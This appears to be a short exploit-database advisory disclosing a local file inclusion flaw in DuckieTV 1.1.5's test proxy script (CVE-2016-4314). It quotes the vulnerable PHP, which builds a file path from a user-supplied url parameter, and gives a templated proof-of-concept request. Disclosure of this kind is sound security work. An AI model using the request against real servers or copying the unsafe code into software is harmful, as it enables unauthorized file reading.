|
| Exploit Title: DuckieTV CMS Local File Inclusion
| Exploit Author: Ashiyane Digital security Team
| Vendor Homepage: http://schizoduckie.github.io/DuckieTV/
| Software Link:
https://github.com/SchizoDuckie/DuckieTV/archive/angular.zip
| Version: DuckieTV 1.1.5
| Date: 2017-10-14
| Category: webapps
| Tested on: Kali-Linux /FireFox
| CVE : CVE-2016-4314
|__________________________________________________

 Vulnerable File :

$_GET[&#039;url&#039;])).&#039;.json&#039;;

// if there&#039;s a cached version of this request in fixtures, serve it.
if(file_exists(dirname(__FILE__).&#039;/fixtures/&#039;.$cache)) {
    $out =
json_decode(file_get_contents(dirname(__FILE__).&#039;/fixtures/&#039;.$cache),true);
    $out[&#039;headers&#039;][&#039;Content-Length&#039;] = strlen($out[&#039;content&#039;]);
    unset($out[&#039;headers&#039;][&#039;Transfer-Encoding&#039;]);
    unset($out[&#039;headers&#039;][&#039;Cookie&#039;]);
    foreach($out[&#039;headers&#039;] as $key=>$val) {
        header("{$key}: {$val}");
    }
    header(&#039;Proxy-Cache-hit: &#039;.$cache);
    die($out[&#039;content&#039;]);
} else {
    header(&#039;Proxy-Cache-miss: &#039;.$cache);
}

Proof of Concept :

http://127.0.0.1/7/DuckieTV-angular/tests/proxy.php?url=[LFI]

__________________________________________________

Discovered By : M.R.S.L.Y

